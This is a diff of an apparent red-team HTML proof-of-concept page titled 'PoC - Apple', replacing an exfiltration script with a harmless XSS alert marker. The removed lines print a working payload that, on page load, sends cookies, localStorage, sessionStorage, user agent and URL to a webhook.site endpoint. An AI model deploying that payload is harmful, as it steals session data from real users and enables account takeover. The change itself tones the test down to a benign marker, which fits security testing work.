@@ -1,25 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="UTF-8">
-  <title>PoC - Apple</title>
+<meta charset="UTF-8">
+<title>RedTeam Marker</title>
 </head>
-<body>
-  <h2>Collecting Data...</h2>
-  <script>
-    fetch("https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        cookie: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage),
-        userAgent: navigator.userAgent,
-        url: window.location.href
-      })
-    });
-  </script>
+<body style="background-color:#fff; text-align:center; padding-top:50px;">
+<h1 style="color:red; font-size:50px;">[MARKER RED - SUCCESS]</h1>
+<script>
+    alert('REDTEAM_XSS_MARKER');
+    document.body.insertAdjacentHTML('beforeend', '<p>Proof of Concept Executed</p>');
+</script>
 </body>
 </html>
